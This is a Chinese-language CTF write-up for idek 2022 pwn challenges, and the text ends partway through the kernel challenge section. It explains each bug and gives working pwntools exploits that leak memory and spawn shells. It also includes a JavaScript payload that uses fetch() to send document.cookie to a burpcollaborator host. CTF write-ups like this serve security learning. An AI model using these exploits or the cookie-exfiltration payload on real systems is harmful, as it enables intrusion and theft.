# idek 2022* Pwn && Reverse Writeup

## 前言:

idek* 2022有一些有趣的pwn和reverse题目.pwn差了一个题目AK,reverse差得比较多.之后有时间再进行相关的总结.另外有兴趣打国际赛的小伙伴.欢迎简历`root@r3kapig.com`,欢迎更多reverse,pwn,crypto,web的小伙伴.

![](https://i.imgur.com/nvVnauC.png)

## Pwn:

### Typop:

一道栈溢出pwn题，存在一个后门函数vuln，但是需要控制a1,a2,a3三个参数，泄露canary和pie以及栈地址后，通过修改rbp来跳转到后门函数，通过栈地址控制filename为flag

![](https://i.imgur.com/unadfwC.png)

exp:

```python
 from pwn import *

p = process('./chall')
#p=remote('typop.chal.idek.team',1337)
# libc=ELF('./libc.so.6')
#context.log_level = 'debug'
context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
gdb.attach(p,'b* $rebase(0x138E)')
sla('Do you want to complete a survey?','y')

sa('Do you like ctf?','a'*11)
ru('a'*10)
canary=u64(p.recv(8).ljust(8,'\x00'))-0x61
info('canary->'+hex(canary))
stackaddr=u64(p.recv(6).ljust(8,'\x00'))
sa('Can you provide some extra feedback?','a'*10+p64(canary))
info('stack->'+hex(stackaddr))
sla('Do you want to complete a survey?','y')
sa('Do you like ctf?','a'*0x1a)
ru('a'*0x1a)
textaddr=u64(p.recv(6).ljust(8,'\x00'))-0x1447
info('text->'+hex(textaddr))
target=0x1273+textaddr
sa('Can you provide some extra feedback?','a'*10+p64(canary)+p64(stackaddr+0x6c)+p64(target)+'a\x00\x00\x00'+'l\x00\x00\x00'+'f\x00\x00\x00')
p.interactive()
```

### Sprinter:

由于Sprintf的format和dest参数相同，因此存在边解析边copy的情况，因此我们可以用%s+\x00来绕过strchr对于n字符的过滤，通过\x00来绕过strchr的检测，然后通过%s来覆写掉我们的\x00。这样我们就可以使用%n。然后改返回地址为vuln函数中的0x401209（这里我没注意，返回的是一个非程序本身的gadget，不过还是能执行，返回0x40120e应该也行），同时更改掉strchr的got表。
由于fgets有0x100的长度，我有几个思路：

1. 更改stack_chk_fail函数的got表为ret，然后利用字符串末尾的%s实现栈溢出，不过由于我们实现ROP途中很多地址带0，%s不太好造成能够覆盖一条ROP链的溢出。
2. 更改strchr got表为printf，重回vuln函数之后可以造成裸的printf的格式化字符串漏洞。这里由于printf_plt末尾为\xd0，我们一共只有0x100的长度，不够用。因此也放弃。
3. 更改strchr got表为pop1_ret的gadget，然后可执行ROP链，这里仍需注意：我最开始更改的是pop6_ret的gadget，这会导致重回vuln函数失败。然后就是普通的泄露libc基址后调用system+/bin/sh提权。（由于栈错位，这里fgets读取的输入会覆盖掉fgets的返回地址，因此不用再触发strchr即可控制程序执行流）。

exp:

```py
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level = 'debug'

def qwq(name):
  log.success(hex(name))

def debug(point):
  gdb.attach(r,'b '+str(point))

r = process('/mnt/hgfs/ubuntu/idek/sprinter/vuln')
# r = remote('sprinter.chal.idek.team',1337)
elf =ELF('/mnt/hgfs/ubuntu/idek/sprinter/vuln')
libc = ELF('/mnt/hgfs/ubuntu/idek/sprinter/libc-2.31.so')

r.recvuntil(b"Enter your string into my buffer, located at ")
stack_addr = int(r.recvuntil(b':')[:-1],16)
target_addr = stack_addr-8

debug("sprintf")
# debug(" *0x401245")
# gdb.attach(r)


# payload = b'%sa\x00%'+b'b'*0x3+b'c%9$hhn'+b'bbbbbbb'+b'%33$hhn'
payload = b'%sa\x00%'+b'b'*0x3+b'c%31$hhn'+b'%bbbbbbbbc'+b'%33$hhn'+b'%'+b'b'*(0x30-5)+b'c%34$n'+b'%'+b'b'*(0x26+0xc-2)+b'c%32$hhn'
payload=payload.ljust(0xd0,b'\x00')
payload=payload+p64(target_addr)+p64(elf.got["strchr"])+p64(elf.got["strchr"]+1)+p64(elf.got["strchr"]+2)
#printf_plt = 0x4010d0
#pop5_ret = 0x401366

r.sendline(payload)
# r.recvuntil(b'(')
pause()
pop_rdi = 0x0000000000401373
leak_payload = p64(pop_rdi)+p64(elf.got["fgets"])+p64(elf.plt["printf"])+p64(0x40122F)
r.sendline(leak_payload)
libc_base = u64(r.recvuntil(b'\x7f')[-6:].ljust(0x8,b'\0'))-libc.sym["fgets"]
system_addr = libc_base+libc.sym["system"]
pause()
r.sendline(b'/bin/sh\x00'+b'a'*0x10+p64(pop_rdi+1)+p64(pop_rdi)+p64(stack_addr)+p64(system_addr))

qwq(stack_addr)
qwq(libc_base)
r.interactive()
```

### Coroutine:

考的 C++20 协程，可以参考这个来理解流程

1. C++20协程原理和应用(https://zhuanlan.zhihu.com/p/497224333)
2. C++ 协程——实战演示 - Incredibuild(https://www.incredibuild.cn/blog/cppxiechengshizhanyanshi)
保护全开，代码中有将 flag 加载进栈上的操作。初步怀疑是竞争问题或者逻辑漏洞，肯定不是内存安全。

大概推测可能跟协程引用了被换掉的 buffer 地址有关。

漏洞点是这里（里面的 printf 都是我自己加的）：

```cpp
Task<bool> SendAllAsyncNewline(io_context& ctx, int socket, std::span<std::byte> buffer)
{
    std::byte buffer2[513];
    // buffer 堆地址
    printf("SendAllAsyncNewline buffer: %p\n", buffer.data());
    // buffer2 栈地址，这块地址会跟存放 flag 的栈地址重叠
    printf("SendAllAsyncNewline buffer2: %p\n", buffer2);
    std::copy(buffer.begin(), buffer.end(), buffer2);
    buffer2[buffer.size()] = (std::byte)'\n';
    
    return SendAllAsync(ctx, socket, std::span(buffer2, buffer.size()+1));
}

Task<bool> SendAllAsync(io_context& ctx, int socket, std::span<std::byte> buffer)
{    
    // 这里的 buffer 是栈地址
    printf("SendAllAsync origin buffer: %p\n", buffer.data());
    int offset = 0;
    // 如果没有完全写入，则会重新写
    while (offset < buffer.size())
    {
        printf("SendAllAsync before SendAsync buffer: %p\n", buffer.data() + offset);
        int result = co_await SendAsync(ctx, socket, std::span(buffer.data() + offset, buffer.size() - offset));
        printf("SendAsync result: %d(%x)", result, result);
        if (result == -1)
        {
            co_return false;
        }

        offset += result;
    }
    co_return true;
}
```

由于SendAllAsyncNewline函数传给 SendAllAsync函数中 SendAsync 协程的那个 buffer 是**一个和 flag 重叠的栈地址**，因此只要能在 SendAllAsync 函数中 while 循环里做一次竞争，就能把 flag 打出来（理论上）

这里的竞争是这样的：
1. 设置 proxy 的接收窗口
2. 多次让 bin 向 proxy 发送大量数据，填充 proxy 的接收窗口至将满时（**不要全满，留一两个字节左右**）（**注意 proxy 自始自终不要去读取，也就是第五个选项不要点**）
3. 接下来继续，调用 SendAsync 发送**512字节数据（即把发送数据的大小拉满）**给 proxy，由于这是该函数第一次循环 SendAsync，因此这里 buffer 中的数据仍然是被 copy 后的无效数据。而又由于前两步已经使得 proxy 发送窗口很小了（只剩下几个字节）。因此循环的第一次 SendAsync 只会成功发送几个字节，之后进入循环的第二次 SendAsync  调用，发送失败返回 EAGAIN，协程挂起，返回至 run_until_return 函数。
4. 控制流从 run_until_return 函数执行完协程后，调用 load flag 将 flag 加载至栈上
5. Proxy 大量 recv，空出 proxy 的接收窗口
6. 控制流在 run_until_return 函数中发现接收窗口空出，调用先前被挂起的协程，协程SendAsync继续尝试发送 buffer 数据。由于这里竞争成功加载进了 flag，因此这里的 buffer 中是会含有 flag 的，发送给 proxy，获取到 flag。

exp:
```python
➜  attachments nc coroutine.chal.idek.team 1337
== proof-of-work: disabled ==
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 2
Buffer size> 1
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 1
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 4
Data> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 4
Data> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 4
Data> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 4
Data> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 4
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Data> Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 4
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaData> 
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 4
Data> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 5
Size> 4096
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 5
Size> 4096
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 5
Size> 4096
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x08\xfcz\xce\x94U\x00\x00@0\xb0\x171\x7f\x00\x00\xd3to\x171\x7f\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00.\x84\xa2\xdaT8{\x00\x00\x00\x00aaaa`\xff\xff\xff\xff\xff\xff\xff\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x08\xfcz\xce\x94U\x00\x00@0\xb0\x171\x7f\x00\x00\xd3to\x171\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xed\xdfm\x171\x7f\x00\x00@gV\x171\x7f\x00\x00\x00\x86\x86\x171\x7f\x00\x00@\xd2\xd4\xcf\x94U\x00\x00\xa7\rm\x171\x7f\x00\x00@\x03\x7f\xf5\xfe\x7f\x00\x00`\x00\x7f\xf5\xfe\x7f\x00\x000\xd2\xd4\xcf\x94U\x00\x00;fz\xce\x94U\x00\x00aaaaaaaa@\xd2\xd4\xcf\x94U\x00\x00idek{exploiting_coroutines}\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00.\x84\xa2\xdaT8{ \xd4\xd4\xcf\x94U\x00\x00p\xff~\xf5\xfe\x7f\x00\x00P\xff~\xf5\xfe\x7f\x00\x00\x1a\x9cz\xce\x94U\x00\x00\x00\xd5\xd4\xcf\x94U\x00\x00\x8c\xff~\xf5\xfe\x7f\x00\x00p\xff~\xf5\xfe\x7f\x00\x00F\xa2z\xce\x94U\x00\x00\x00\xd5\xd4\xcf\x94U\x00\x00\x8c\xff~\xf5\xfe\x7f\x00\x00\x90\xff~\xf5\xfe\x7f\x00\x00X\x03\x7f\xf5\xfe\x7f\x00\x00\xa8\xff~\xf5\xfe\x7f\x00\x00\xb0\xff~\xf5\xfe\x7f\x00\x00\xc0\xff~\xf5\xfe\x7f\x00\x00\xf0\xff~\xf5\xfe\x7f\x00\x00\xc0\xff~\xf5\xfe\x7f\x00\x00\xb8\xd4\xd4\xcf\x94U\x00\x00\xc0\xff~\xf5\xfe\x7f\x00\x00$\x8ez\xce\x94U\x00\x00\x00\xd5\xd4\xcf\x94U\x00\x00\xb0\xd4\xd4\xcf\x94U\x00\x00\x00\x00\x7f\xf5\xfe\x7f\x00\x00n\x8dz\xce\x94U\x00\x00'
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 5
Size> 4096
b'\x00\xd5\xd4\xcf\x94U\x00\x00\x98\xd4\xd4\xcf\x94U\x00\x00\x00'
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> 
```

### Relativity:

程序有一个明显的格式化字符串漏洞，但是最后程序执行了_Exit，几乎和系统调用exit相同了。所以，首先想办法能够多次利用。在解析free符号时，会根据link_map->l_addr最后写回函数地址。link_map在栈上，通过修改l_addr = l_addr + 0x30， 使得free的地址被填入exit@got，这样栈发生了偏移，栈上保存的main函数地址会成为free的返回地址，这样我们就可以不断利用格式化字符串。之后的利用就是简单的格式化字符串漏洞利用了。

```py
from pwn import *
leak = lambda name,addr: log.success('{0}\t--->\t{1}'.format(name, hex(addr)))

binary = './vuln'
libc = "./libc-2.31.so"
context.terminal = ['tmux', 'splitw', '-h']
# context.binary = binary
context.log_level='debug'
# p = process(binary)
p = remote('relativity.chal.idek.team', 1337)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)

# link_map->l_addr += 0x38, write free at exit@got
p.sendlineafter("?", "%{}c%30$hhn||%11$p||%15$p||%13$p".format(0x38))
p.recvuntil("0x")
libc_base = int(p.recv(12), 16) - libc.sym['__libc_start_main'] - 243
leak("libc_base", libc_base)

p.recvuntil("0x")
text_base = int(p.recv(12), 16) - 0x000134A
leak("text_base", text_base)

p.recvuntil("0x")
stack = int(p.recv(12), 16)
leak("stack", stack)

free_got = text_base + 0x4018
main = text_base + 0x000134A
one = libc_base + 0xe3b01

# a pointer in stack to free@got
p.sendlineafter("?", "%{}c%34$hn".format((stack&0xffff)-0x8*4))
p.sendlineafter("?", "%{}c%53$hn".format((free_got&0xffff)))

# free@got == main
p.sendlineafter("?", "%{}c%55$hn".format((main&0xffff)))

# exit@got == one_gadget
p.sendlineafter("?", "%{}c%65$hhn".format(((free_got+0x30+8)&0xff)))
p.sendlineafter("?", "%{}c%67$hn".format(((one)&0xffff)))
# recover link_map
p.sendlineafter("?", "%66$hhn%{}c%77$hhn".format((free_got+0x30+8+2)&0xffff))
p.sendlineafter("?", "%{}c%79$hn".format(((one>>16)&0xffff)))

# recover free@got, pwn!
p.sendlineafter("?", "%{}c%89$hhn".format(((free_got)&0xff)))
p.sendlineafter("?", "%{}c%91$hn".format(((text_base+0x1030)&0xffff)))

'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
  '''

p.interactive()
```

### Weep:

看main.c的C语言，delete函数中很明显的UAF问题

主要逆向了wasm中的以下函数：
- wasm的memory是一个巨大的ArrayBuffer，以下用m代指
- add函数：
  - `m[66144 + (idx << 3) + 4] = strlen(m[8+var4])`
  - `m[66144 + (idx << 3)] = strdup(m[8+var4])`
- `setTitle`函数：`m[66112] = 1/2/3`，分别对应着`title_fp`指针指向`mrTitle`/`mrsTitle`/`emscripten_run_script`三个函数
- `greet`函数中，判断的`numCalls`位于`m[66128]`
- 用到的gc是`dlmalloc`和`dlfree`，应该是`ptmalloc`的起源。总之，debug wasm来观察堆块的分配模式，之后尝试了下类似于fastbin模式的利用，发现是可以的
  - 分配到`m[66112]` ，修改为3，即指向`emscripten_run_script`函数
  - 分配到`m[66128]`，将`numCalls`改成负数（0xfffffff8）
- `emscripten_run_script`在index.js加入了长度小于23的限制，所以拼接指令最后拿flag

exp

```js
let code = 'fetch("http://xxx.burpcollaborator.net",{method:"POST",mode:"no-cors",body:document.cookie})';

console.log(btoa(JSON.stringify([
    [0,0,"aaaa"],
    [0,1,"aaaa"],
    [0,2,"aaaa"],
    [0,3,"aaaa"],
    [0,4,"aaaa"],
    [0,5,"aaaaaaaaaaaaaaaaaaaa"],
    [1,0],
    [1,2],
    [2,2,"8\x02\x01"],
    [0,6,"aaaa"],
    [0,6,"\x03"],
    [1,1],
    [1,3],
    [2,3,"H\x02\x01"],
    [0,7,"aaaa"],
    [0,7,"\xf8\xff\xff\xff"],
    [2,5,"window.a=''"],
    [3,5],
    ...[...code].reduce((total, char) => (
        total = [...total, [2,5,`a+='${char}'`],[3,5]]
    ), []),
    [2,5,"eval(a)"],
    [3,5],
])));
```

### Sofire=good:

题目本身与区块链没有关系。是一个内核菜单堆题。虽然开启了kaslr，但是我们可以读取kallsyms的内容，从而泄露内核地址。

程序有四种功能：

```
#define NFT_RMALL  0x1337
#define NFT_ADD    0xdeadbeef
#define NFT_GET    0xcafebabe
#define NFT_EDIT   0xbabecafe
```

所有的结点使用带有头节点的单链表维护，并且头节点是全局变量。

```
typedef struct sofirium_head{
    char coin_art[0x70];
    struct sofirium_entry* head;
    int total_nft;
} sofirium_head;

typedef struct sofirium_entry{
    struct sofirium_entry* next;
    char nft[CHUNK_SIZE];
} sofirium_entry;

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;

sofirium_head * head;
```

漏洞点：
- 在rmall中会将所有的结点都free， 包括头节点，但是没有置空造成了UAF。
- 在edit和get中，使用req->idx作为索引的上限，即我们的idx可以大于total_nft实现越界访问。
要实现任意地址读写就要控制结构的next指针，在msg_msg结构中正好有这个指针供我们利用。我们发送的所有消息都会被链入list_head。我们能控制的大小为0x100，如果两个小message相邻，就可以控制next指针实现任意地址读写。

利用思路：
- 泄露内核地址
- 申请一定数量的结点，并将它们全部释放
- 使用msg_msg结构复用其中一个结点的空间
